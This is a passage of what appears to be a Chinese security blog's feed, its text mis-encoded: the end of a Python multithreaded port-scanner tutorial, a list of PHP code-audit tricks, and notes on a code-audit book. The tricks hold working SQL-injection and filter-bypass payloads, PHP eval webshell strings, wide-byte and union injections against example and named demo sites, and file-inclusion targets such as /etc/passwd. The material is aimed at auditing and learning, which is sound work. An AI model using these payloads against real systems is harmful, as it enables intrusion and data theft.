    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        lock.acquire()
        print &quot;Opened Port:&quot;,port
        lock.release()
</code></pre><p><strong>é™„ï¼š</strong></p>
<p>1.<a href="http://orangeholic.iteye.com/blog/1720421" target="_blank" rel="external">Pythonçš„é”</a></p>
<p>2.<a href="http://www.oschina.net/question/197184_79369" target="_blank" rel="external">å¤šçº¿ç¨‹lock.acquire()</a></p>
<p>æ³¨æ„å½“è¾“å‡ºæ‰§è¡Œå®Œåè¦é‡Šæ”¾é”lockã€‚</p>
<p>è¾“å…¥çš„å¤„ç†åŠlockçš„åˆ›å»ºå¯ä»¥æ”¾åœ¨mainå‡½æ•°ä¸­ï¼š</p>
<pre><code>if __name__==&apos;__main__&apos;:
    # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
    host = sys.argv[1]
    portstrs = sys.argv[2].split(&apos;-&apos;)

    start_port = int(portstrs[0])
    end_port = int(portstrs[1])

    target_ip = gethostbyname(host)

    lock = thread.allocate_lock()
</code></pre><font color="#000ff">ç„¶åä¿®æ”¹forå¾ªç¯ï¼š</font>

<pre><code>for port in range(start_port, end_port):
    thread.start_new_thread(tcp_test, (port,))
</code></pre><p><code>thread.start_new_thread</code> ç”¨æ¥åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œè¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸ªå…ƒç»„ï¼Œä½œä¸ºå‡½æ•°çš„è¾“å…¥ï¼Œç”±äº <code>tcp\_test</code> å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>(port,)</code>è¿™ç§å½¢å¼è¡¨ç¤ºè¿™ä¸ªå‚æ•°ä¸ºå…ƒç»„ã€‚</p>
<p><strong>thread.start_new_threadå‚è€ƒèµ„æ–™å¦‚ä¸‹ï¼š</strong></p>
<p>è¿™ä¸ªæ˜¯<code>thread.start_new_thread(function,args[,kwargs])</code>å‡½æ•°åŸå‹ï¼Œå…¶ä¸­functionå‚æ•°æ˜¯ä½ å°†è¦è°ƒç”¨çš„çº¿ç¨‹å‡½æ•°ï¼›argsæ˜¯è®²ä¼ é€’ç»™ä½ çš„çº¿ç¨‹å‡½æ•°çš„å‚æ•°ï¼Œå®ƒå¿…é¡»æ˜¯ä¸ªtupleç±»å‹ï¼ˆå…ƒç»„ï¼‰ï¼›è€Œkwargsæ˜¯å¯é€‰çš„å‚æ•°ã€‚çº¿ç¨‹çš„ç»“æŸä¸€èˆ¬ä¾é çº¿ç¨‹å‡½æ•°çš„è‡ªç„¶ç»“æŸï¼›ä¹Ÿå¯ä»¥åœ¨çº¿ç¨‹å‡½æ•°ä¸­è°ƒç”¨thread.exit()ï¼Œå®ƒæŠ›å‡ºSystemExit exceptionï¼Œè¾¾åˆ°é€€å‡ºçº¿ç¨‹çš„ç›®çš„ã€‚</p>
<p>è¿™é‡Œè¿è¡Œç¨‹åºä¼šæŠ¥é”™ï¼š</p>
<pre><code>Unhandled exception in thread started by 
sys.excepthook is missing 
lost sys.stderr 
</code></pre><p>ç½‘ä¸Šè§£é‡Šä¸ºï¼š</p>
<font color="#000ff">ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šå› ä¸ºä¸»è¿›ç¨‹å·²ç»ç»“æŸï¼Œç›¸å…³çš„èµ„æºå·²ç»é‡Šæ”¾ï¼Œè€Œçº¿ç¨‹è¿˜åœ¨åå°è¿è¡Œï¼Œæ‰€ä»¥ä¼šå¯¼è‡´çº¿ç¨‹æ‰¾ä¸åˆ°ç›¸å…³çš„èµ„æºå’Œå®šä¹‰<br><br>ç¬¬äºŒä¸ªé—®é¢˜ï¼šå› ä¸ºä¸»ç¨‹åºç»“æŸçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰ç­‰å¾…å­çº¿ç¨‹ç»“æŸï¼Œä¹Ÿæ²¡æœ‰å¼ºåˆ¶å…³é—­å­çº¿ç¨‹ï¼Œå› æ­¤è¿˜åœ¨åå°è¿è¡Œï¼Œæœ‰ä¸¤ä¸ªåŠæ³•å¯ä»¥è®©ä»–ä»¬åŒæ—¶ç»“æŸï¼Œä¸€ä¸ªåŠæ³•æ˜¯åœ¨åœ¨æ„å»ºè¿›ç¨‹çš„æ—¶å€™å¢åŠ å‚æ•° deamon=True, ç¬¬äºŒä¸ªåŠæ³•å°±æ˜¯åœ¨ç¨‹åºæœ€åå¢åŠ thread1.join(),thread2.join()</font>

<p>ä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œæˆ‘çš„è§£å†³åŠæ³•ä¸ºï¼š</p>
<p>åœ¨ä¸»å‡½æ•°ä¸ŠåŠ é‡Œä¸€ä¸ª<code>time.sleep(1)</code></p>
<p>å®Œæ•´çš„ç¨‹åºä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>#!/usr/bin/python
# -*- coding: UTF-8 -*-
&apos;&apos;&apos;
@Authorï¼šjoy_nick
@åšå®¢ï¼šhttp://byd.dropsec.xyz/
&apos;&apos;&apos;
import sys
import thread
from socket import *

def tcp_test(port):
    sock = socket(AF_INET, SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        lock.acquire()
        print &apos;ä¸»æœº:%s&apos;%(target_ip)
        print &quot;å¼€æ”¾çš„ç«¯å£ä¸º:&quot;,port
        print &apos;\n&apos;
        lock.release()
        thread.exit()

if __name__==&apos;__main__&apos;:
    # portscan.py &lt;host&gt; &lt;start_port&gt;-&lt;end_port&gt;
    host = sys.argv[1]
    portstrs = sys.argv[2].split(&apos;-&apos;)

    start_port = int(portstrs[0])
    end_port = int(portstrs[1])

    target_ip = gethostbyname(host)

    lock = thread.allocate_lock()

    for port in range(start_port, end_port):
        thread.start_new_thread(tcp_test, (port,))
        time.sleep(1)
</code></pre><p>è¿è¡Œå®ä¾‹å¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/port_scan2.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHPä»£ç å®¡è®¡æŠ€å·§]]></title>
      <url>/2016/08/23/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>1ã€<font color="#0000FF">$_SERVER[â€˜PHP_SELFâ€™]å’Œ$_SERVER[â€˜QUERY_STRINGâ€™]ï¼Œè€Œ$_SERVERå¹¶æ²¡æœ‰è½¬ä¹‰ï¼Œé€ æˆäº†æ³¨å…¥ã€‚</font></p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code>/easy/index.php/aaa&apos;,(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(3),0)),1)#
</code></pre><a id="more"></a>
<p>2ã€<font color="#0000FF">updateæ›´æ–°æ—¶æ²¡æœ‰é‡æ„æ›´æ–°åºåˆ—ï¼Œå¯¼è‡´æ›´æ–°å…¶ä»–å…³é”®å­—æ®µ</font></p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>id=1&amp;data=1991-03-16&amp;money=10000000</p>
</blockquote>
<p>3ã€<font color="#0000FF">åœ¨ phpä¸­ å¦‚æœä½¿ç”¨äº†ä¸€ä¸ªæœªå®šä¹‰çš„å¸¸é‡ï¼ŒPHP å‡å®šæƒ³è¦çš„æ˜¯è¯¥å¸¸é‡æœ¬èº«çš„åå­—ï¼Œå¦‚åŒç”¨å­—ç¬¦ä¸²è°ƒç”¨å®ƒä¸€æ ·ï¼ˆCONSTANT å¯¹åº” â€œCONSTANTâ€ï¼‰ã€‚æ­¤æ—¶å°†å‘å‡ºä¸€ä¸ª E_NOTICE çº§çš„é”™è¯¯ï¼ˆå‚è€ƒ<a href="http://php.net/manual/zh/language.constants.syntax.phpï¼‰" target="_blank" rel="external">http://php.net/manual/zh/language.constants.syntax.phpï¼‰</a></font></p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>æœªå®šä¹‰å¸¸é‡if(IN_ADMIN != TRUE) ç­‰å¼ä¸æˆç«‹ï¼Œé0ã€nulléƒ½ä¸ºtrue</p>
</blockquote>
<p>4ã€<font color="#0000FF">PHPä¸­è‡ªç¼–å†™å¯¹æ ‡ç­¾çš„è¿‡æ»¤æˆ–å…³é”®å­—è¿‡æ»¤ï¼Œåº”æ”¾åœ¨strip_tagsç­‰å»é™¤å‡½æ•°ä¹‹åï¼Œå¦åˆ™å¼•èµ·è¿‡æ»¤ç»•è¿‡ã€‚</font></p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code>function mystrip_tags($string)
{
$string = remove_xss($string);
$string = new_html_special_chars($string);
$string = strip_tags($string);//remove_xssåœ¨strip_tagsä¹‹å‰è°ƒç”¨ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°ç»•è¿‡,åœ¨å…³é”®å­—ä¸­æ’å…¥htmlæ ‡è®°.
return $string;
}
</code></pre><p>å¯¹å…³é”®å­—è¿‡æ»¤ä¹‹åå­˜åœ¨å­—ç¬¦æ›¿æ¢ã€htmlå»é™¤ç­‰æ“ä½œå¯æ„é€ å¤šä½™å­—ç¬¦ç»•è¿‡ã€‚</p>
<p>ä¾‹å¦‚ï¼šæäº¤</p>
<pre><code>user/**/W&lt;a&gt;HERE/**/IF((S&lt;a&gt;ELECT/**/A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING(PASSWORD,1,1))F&lt;a&gt;ROM/**/ts_user/**/L&lt;a&gt;IMIT 1)=101,1=S&lt;a&gt;LEEP(2.02),0)%23
</code></pre><p>ç”±äºå…¨å±€å…³é”®å­—è¿‡æ»¤ä¹‹åå­˜åœ¨strip_tags()å‡½æ•°å¯ç»•è¿‡ã€‚</p>
<p>5ã€<font color="#0000FF">å½“å¯æ§å˜é‡è¿›å…¥åŒå¼•å·ä¸­æ—¶å¯å½¢æˆwebshell</font></p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code>$a = &quot;${@eval($_POST[s])}&quot;;
$a = &quot;${${eval($_POST[s])}}&quot;;
</code></pre><p>å› æ­¤ä»£ç æ‰§è¡Œä½¿ç”¨${file_put_contents($_GET[f],$_GET[p])}å¯ä»¥ç”Ÿæˆwebshellã€‚</p>
<p>6ã€<font color="#0000FF">å®½å­—èŠ‚è½¬ç¼–ç è¿‡ç¨‹ä¸­å‡ºç°å®½å­—èŠ‚æ³¨å…¥</font></p>
<blockquote>
<p>ä¾‹å¦‚ï¼šæµ‹è¯•è¾“å…¥ <code>%e5%5c%5c&#39;</code> ä¸¤ä¸ª<code>\\&#39;</code>åˆ™å•å¼•å·å‡ºæ¥</p>
</blockquote>
<p>7ã€<font color="#0000FF">æ„é€ æŸ¥è¯¢è¯­å¥æ—¶æ— æ³•åˆ é™¤ç›®æ ‡è¡¨ä¸­ä¸å­˜åœ¨å­—æ®µæ—¶å¯ä½¿ç”¨mysqlå¤šè¡¨æŸ¥è¯¢ç»•è¿‡ã€‚</font></p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>select uid,password from users,adminsï¼›<br>(uidå­˜åœ¨äºusersã€passwordå­˜åœ¨äºadminsï¼‰</p>
</blockquote>
<p>8ã€<font color="#0000FF">mysqlä¸­ï¼ˆåå¼•å·ï¼‰èƒ½ä½œä¸ºæ³¨é‡Šç¬¦ï¼Œä¸”ä¼šè‡ªåŠ¨é—­åˆæœ«å°¾æ²¡æœ‰é—­åˆçš„åå¼•å·ã€‚æ— æ³•ä½¿ç”¨æ³¨é‡Šç¬¦çš„æƒ…å†µä¸‹ä½¿ç”¨åˆ«åas+åå¼•å·å¯é—­åˆå…¶åè¯­å¥ã€‚</font></p>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>select <code>username</code>,<code>password</code> from pre_common_statuser as ` as statistic from common_stat where uid=1</p>
</blockquote>
<p>æ­¤å¤„ï¼ˆpassword from pre_common_statuser as ï¼‰ä¸ºæ³¨å…¥è¯­å¥ï¼Œä½¿ç”¨åˆ«åasä¸è‡ªå¸¦æ— è§†å…¶åè¯­å¥ã€‚</p>
<p>9ã€<font color="#0000FF">mysqlçš„ç±»å‹å¼ºåˆ¶è½¬æ¢å¯ç»•è¿‡PHPä¸­empty()å‡½æ•°å¯¹0çš„falseè¿”å›ã€‚</font></p>
<blockquote>
<p>ä¾‹å¦‚ï¼šæäº¤/?test=0axxx    -&gt; empty($_GET[â€˜testâ€™]) =&gt; è¿”å›çœŸ</p>
</blockquote>
<p>10ã€<font color="#0000FF">å­˜åœ¨å…¨å±€è¿‡æ»¤æ—¶è§‚å¯Ÿè¿‡æ»¤æ¡ä»¶æ˜¯å¦æœ‰ifåˆ¤æ–­è¿›å…¥ï¼Œcmså¯èƒ½å­˜åœ¨è‡ªå®šä¹‰safekeyä¸å¯ç”¨å…¨å±€è¿‡æ»¤ã€‚é€šè¿‡ç¨‹åºé—ç•™æˆ–è€…åŸæœ‰ç•Œé¢è¾“å‡ºsafekeyå¯¼è‡´ç»•è¿‡ã€‚<font></font></font></p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code>if($config[&apos;sy_istemplate&apos;]!=&apos;1&apos; || md5(md5($config[&apos;sy_safekey&apos;]).$_GET[&apos;m&apos;])!=$_POST[&apos;safekey&apos;])
{
foreach($_POST as $id=&gt;$v){
safesql($id,$v,&quot;POST&quot;,$config);
$id = sfkeyword($id,$config);
$v = sfkeyword($v,$config);
$_POST[$id]=common_htmlspecialchars($v);
}
}
</code></pre><p>11ã€<font color="#0000FF">ç”±äºå…¨å±€è¿‡æ»¤å­˜åœ¨ç™½åå•é™å®šåŠŸèƒ½ï¼Œå¯ä½¿ç”¨æ— ç”¨å‚æ•°å¸¦å…¥ç»•è¿‡ã€‚</font><br>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url))</p>
</blockquote>
<p>å…¶ä¸­å…·ä½“è¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š</p>
<p>//åå°ç™½åå•,åå°æ“ä½œå°†ä¸ä¼šæ‹¦æˆª,æ·»åŠ â€|â€éš”å¼€ç™½åå•ç›®å½•ä¸‹é¢é»˜è®¤æ˜¯ç½‘å€å¸¦ admin /dede/ æ”¾è¡Œ</p>
<blockquote>
<p>$webscan_white_directory=â€™admin|/dede\/|/install/â€˜;</p>
</blockquote>
<p>//urlç™½åå•,å¯ä»¥è‡ªå®šä¹‰æ·»åŠ urlç™½åå•,é»˜è®¤æ˜¯å¯¹phpcmsçš„åå°urlæ”¾è¡Œ</p>
<p>//å†™æ³•ï¼šæ¯”å¦‚phpcms åå°æ“ä½œurl index.php?m=admin php168çš„æ–‡ç« æäº¤é“¾æ¥post.php?job=postnew&amp;step=post ,dedecms ç©ºé—´è®¾ç½®edit_space_info.php</p>
<blockquote>
<p>$webscan_white_url = array(â€˜index.phpâ€™ =&gt; â€˜admin_dir=adminâ€™,â€™post.phpâ€™ =&gt; â€˜job=postnew&amp;step=postâ€™,â€™edit_space_info.phpâ€™=&gt;â€™â€™);</p>
</blockquote>
<p>åªè¦è®©ä¼ å…¥å‚æ•°å­˜åœ¨ç™½åå•ç›®å½•æˆ–å‚æ•°å³å¯ç»•è¿‡ã€‚</p>
<p><strong>åˆ©ç”¨ç™½åå•ç›®å½•ï¼š</strong></p>
<blockquote>
<p><a href="http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1" target="_blank" rel="external">http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=1</a>â€˜ and 1=2 union select xxx</p>
</blockquote>
<p>ç”±äºè¯·æ±‚ä¸­åŒ…å«äº†ç™½åå•ç›®å½•/dede/ï¼Œæ‰€ä»¥æ”¾è¡Œã€‚</p>
<p><strong>åˆ©ç”¨ç™½åå•å‚æ•°ï¼š</strong></p>
<blockquote>
<p><a href="http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1" target="_blank" rel="external">http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=1</a>â€˜ and 1=2 union select xxx</p>
</blockquote>
<p>è¯·æ±‚ä¸­åŒ…å«äº†ç™½åå•å‚æ•°æ‰€ä»¥æ”¾è¡Œã€‚</p>
<p>12ã€<font color="#0000FF">å­—ç¬¦ä¸²æˆªæ–­å‡½æ•°è·å–å®šé•¿æ•°æ®ï¼Œæˆªå–\æˆ–\â€™å‰ä¸€ä½ï¼Œé—­åˆè¯­å¥ã€‚<br>åˆ©ç”¨æ¡ä»¶å¿…é¡»æ˜¯å­˜åœ¨ä¸¤ä¸ªå¯æ§å‚æ•°ï¼Œå‰é—­åˆï¼Œåæ³¨å…¥ã€‚</font><br>ä¾‹å¦‚ï¼š</p>
<pre><code>if (strlen($u_email)&gt;32) { $u_email = substring($u_email,32);}
if (strlen($u_qq)&gt;16) { $u_qq = substring($u_qq,16);}
if (strlen($u_phone)&gt;16) { $u_phone = substring($u_phone,16);}
$u_phone=123456789012345\ å¸¦å…¥ï¼š
UPDATE mac_user SET u_qq=&apos;$u_qq&apos;,u_email=&apos;$u_email&apos;,u_phone=&apos;123456789012345\&apos;,u_question=&apos;$u_question&apos;,u_answer=&apos;$u_answer&apos;,u_password=&apos;$u_password&apos; WHERE u_id=1
</code></pre><p>13ã€<font color="#0000FF">è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·çš„æ³¨å…¥ï¼Œå¯ä½¿ç”¨æ‹¬å·åŒ…è£¹ç»•è¿‡ã€‚å…·ä½“å¦‚é‡åˆ°select fromï¼ˆå…³é”®å­—ç©ºæ ¼åˆ¤æ–­çš„æ­£åˆ™ï¼Œä¸”å‰”é™¤/**/ç­‰ï¼‰å¯ä½¿ç”¨æ‹¬å·åŒ…è£¹æŸ¥è¯¢å­—æ®µç»•è¿‡ã€‚</font><br>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>select(user)from(website);</p>
</blockquote>
<p>å¦å¤–ä¸€ç§æ–¹å¼ï¼š</p>
<pre><code>select{x table_name}from{x information_schema.tables}
select{x(name)}from{x(manager)};
select{wooyun&apos;zone&apos;}from{mysql.user}
select{x+table_name}from{x(information_schema.tables)}
</code></pre><p>14ã€<font color="#0000FF">ç”±äºPHPå¼±ç±»å‹éªŒè¯æœºåˆ¶ï¼Œå¯¼è‡´==ã€in_array()ç­‰å¯é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡éªŒè¯ã€‚</font><br>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>in_array($_GET[â€˜xâ€™],array(1,2,3,4,5))</p>
</blockquote>
<p>è®¿é—®<code>?test=â€™1â€™testtest</code>å¯åˆ¤æ–­æˆåŠŸã€‚</p>
<p>15ã€<font color="#0000FF">WAFæˆ–è€…è¿‡æ»¤äº†and|orçš„æƒ…å†µå¯ä»¥ä½¿ç”¨&amp;&amp;ä¸||è¿›è¡Œç›²æ³¨ã€‚</font></p>
<pre><code>FALSEçš„æƒ…å†µï¼š
1 || 0
TRUEçš„æƒ…å†µï¼š
1 || 1
</code></pre><p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p><a href="http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited" target="_blank" rel="external">http://demo.74cms.com/user/user\_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited</a></p>
</blockquote>
<p>16ã€<font color="#0000FF">windowsä¸‹phpä¸­è®¿é—®æ–‡ä»¶åä½¿ç”¨â€&lt;â€ â€œ&gt;â€å°†ä¼šè¢«æ›¿æ¢æˆâ€*â€ â€œ?â€ï¼Œåˆ†åˆ«ä»£è¡¨Nä¸ªä»»æ„å­—ç¬¦ä¸1ä¸ªä»»æ„å­—ç¬¦ã€‚</font><br>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>file_get_contents(â€œ/images/â€œ.$_GET[â€˜aâ€™].â€.jpgâ€);</p>
</blockquote>
<p>å¯ä½¿ç”¨test.php?a=../a&lt;%00è®¿é—®å¯¹åº”phpæ–‡ä»¶ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> MySQL </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ã€Šä»£ç å®¡è®¡ã€‹è¯»ä¹¦ç¬”è®°]]></title>
      <url>/2016/08/18/%E3%80%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><strong>PHPæ ¸å¿ƒé…ç½®æ–‡ä»¶</strong>ï¼š</p>
<p>1.register_globals=Off(å…¨å±€å˜é‡æ³¨å†Œå¼€å…³)</p>
<p>2.allow_url_include=Off(æ˜¯å¦å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶)ä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰allow_url_fopen</p>
<a id="more"></a>
<p>3.magic_quotes_gpc=On(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤)ä¼šè‡ªåŠ¨åœ¨å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€ç©ºå­—èŠ‚(NULL)çš„å‰é¢åŠ ä¸Šåæ–œ,ä½†æ˜¯åœ¨PHP5ä¸­ä¸ä¼šè¿‡æ»¤$SERVERå˜é‡æ‰€ä»¥å¯ä»¥åˆ©ç”¨client-ipã€refererç­‰æ¼æ´</p>
<p>4.magic_quotes_runtime(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤)å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯å®ƒåªå¯¹ä»æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­è·å–çš„æ•°æ®è¿›è¡Œè¿‡æ»¤</p>
<p>5.magic_quotes_sybase(é­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤)åªæ˜¯å°†å•å¼•å·è½¬ä¸ºåŒå¼•å·ï¼Œè½¬ä¹‰ç©ºå­—èŠ‚</p>
<p>6.safe_mode=on(å®‰å…¨æ¨¡å¼)PHP5.4ä¹‹åå–æ¶ˆ</p>
<p>7.open_basedir(PHPå¯è®¿é—®ç›®å½•)å¤šä¸ªç”¨<code>;</code>éš”å¼€</p>
<p>8.disable_functions(ç¦ç”¨å‡½æ•°)ä¾‹å¦‚å¯ä»¥=<code>phpinfoã€evalã€passthruã€execã€system</code></p>
<p>9.display_errorså’Œerror_reporting=Off(é”™è¯¯æ˜¾ç¤º)</p>
<p><strong>å¸¸è§çš„ä»£ç å®¡è®¡æ€è·¯</strong></p>
<p>1.æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹</p>
<p>2.æŸ¥æ‰¾å¯æ§å˜é‡ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹</p>
<p>3.å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç </p>
<p>4.ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç </p>
<p>æ–‡ä»¶ä¸Šä¼ æ—¶å¯ä»¥æµ‹è¯•æ–‡ä»¶åæ˜¯å¦å­˜åœ¨SQLæ³¨å…¥.</p>
<p>äºŒæ¬¡æ³¨å…¥åŸç†å›¾,å®ä¾‹è¯·çœ‹<a href="http://byd.dropsec.xyz/2016/07/29/SQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">sqli-labs-24</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BA%8C%E6%AC%A1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86.png" alt=""></p>
<p>SQLè¯·æ±‚å¤´æ³¨å…¥ï¼šuser-agent/referer/client-ip/x-forward-for</p>
<p>å¯¹å®½å­—èŠ‚æ³¨å…¥çš„æŒ–æ˜ä¸»è¦çœ‹å¦‚ä¸‹å…³é”®å­—ï¼š</p>
<pre><code>SET NAMES

character_set_client=gbk

mysql_set_charset(&apos;gbk&apos;)
</code></pre><p>äºŒæ¬¡urldecodeæ³¨å…¥ï¼š<code>1.php?id=1%2527</code></p>
<p>intvalç­‰å­—ç¬¦è½¬æ¢<code>intval(&quot;1&#39; union select &quot;)</code> è¾“å‡ºï¼š1</p>
<p>å…³äºå®½å­—èŠ‚æ³¨å…¥çš„æ¨èè§£å†³æ–¹æ³•ï¼š</p>
<pre><code>1.åœ¨æ‰§è¡ŒæŸ¥è¯¢å‰å…ˆæ‰§è¡ŒSET NAMES &apos;gbk&apos;è®¾ç½®ç¼–ç ï¼Œè®¾ç½®character_set_client=binary
2.ä½¿ç”¨mysql_set_charset(&apos;gbk&apos;)è®¾ç½®ç¼–ç ï¼Œç„¶åä½¿ç”¨mysql_real_escasp_string()å‡½æ•°è¿‡æ»¤å‚æ•°
3.ä½¿ç”¨pdoæ–¹å¼ï¼Œåœ¨PHP5.3.6åŠä»¥ä¸‹ç‰ˆæœ¬éœ€è¦è®¾ç½®setAttributeæ¥ç¦ç”¨prepared statementsçš„é˜²çœŸæ•ˆæœ
</code></pre><p>å¯¹äºCSRFçš„é˜²å¾¡ï¼š</p>
<pre><code>1.å¢åŠ token/refereréªŒè¯é¿å…imgæ ‡ç­¾è¯·æ±‚çš„æ”»å‡»
2.å¢åŠ éªŒè¯ç 
</code></pre><p>Tokenå®ç°æµ‹è¯•ä»£ç ï¼š</p>
<pre><code>&lt;?php
session_start();
function set_token() {
    $_SESSION[&apos;token&apos;] = md5(time()+rand(1,1000));
    echo $_SESSION[&apos;token&apos;];
    echo &apos;&lt;/br&gt;&apos;;
}
function check_token() {
    if(isset($_POST[&apos;token&apos;])&amp;&amp;$_POST[&apos;token&apos;] === $_SESSION[&apos;token&apos;])
        return true;
    else
        return false;
}
if(isset($_SESSION[&apos;token&apos;])&amp;&amp;check_token()) {
    echo &quot;success&quot;;
    echo &apos;&lt;/br&gt;&apos;;
}
else {
    echo &quot;failed&quot;;
    echo &apos;&lt;/br&gt;&apos;;
}
set_token();
?&gt;
&lt;form method=&quot;post&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?=$_SESSION[&apos;token&apos;]?&gt;&quot;&gt;
    &lt;input type=&quot;submit&quot;/&gt;
&lt;/form&gt;
</code></pre><p>æ–‡ä»¶åŒ…å«å‡½æ•°çš„åŒºåˆ«ï¼š</p>
<pre><code>include()ã€include_once()åœ¨æ–‡ä»¶åŒ…å«æ—¶å³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¸‹é¢çš„ä»£ç ä¾ç„¶ä¼šç»§ç»­æ‰§è¡Œ
require()ã€require_once()åˆ™ä¼šç›´æ¥æŠ¥é”™é€€å‡ºç¨‹åº
</code></pre><p>windowsä¸‹å¯ä»¥åŒ…å«æ—¥å¿—æ–‡ä»¶</p>
<p>linuxä¸‹å¯ä»¥åŒ…å«/proc/self/environ(é“¾æ¥å½“å‰æ­£åœ¨è¿è¡Œç¯å¢ƒçš„è¿›ç¨‹)ã€/etc/passwd(å¯†ç æ–‡ä»¶) ç­‰æ–‡ä»¶</p>
<p><code>php://filter/</code> PHPè¾“å…¥è¾“å‡ºæµè¯»å–æ–‡ä»¶</p>
<p>æ–‡ä»¶ä¸Šä¼ å‡½æ•°<code>move_uploaded_file()</code></p>
<p>åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œåœ¨æ–‡ä»¶ååé¢åŠ ä¸ªç©ºæ ¼ï¼ˆ%20,æˆ–è€…%81-%99)ï¼Œæœ‰æ—¶å€™å¯ä»¥ç»•è¿‡é»‘åå•é™åˆ¶ã€‚</p>
<p>æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ï¼š</p>
<pre><code>1.ç™½åå•æ–¹å¼è¿‡æ»¤æ–‡ä»¶æ‰©å±•åï¼Œä½¿ç”¨in_arrayæˆ–è€…===æ¥å¯¹æ¯”æ‰©å±•å
2.ä¿å­˜æ–‡ä»¶æ—¶é‡å‘½åæ–‡ä»¶ï¼Œæ–‡ä»¶å‘½åè§„åˆ™é‡‡ç”¨æ—¶é—´æˆ³çš„æ‹¼æ¥éšæœºæ•°çš„MD5æ–¹å¼&quot;md5(time()+rand(1,1000))&quot;.
</code></pre><p>ä»£ç æ‰§è¡Œæ¼æ´å‡½æ•°ï¼š</p>
<blockquote>
<p>eval(),assert(),preg_replace(),call_user_func(),call_user_func_array(),array_map()</p>
</blockquote>
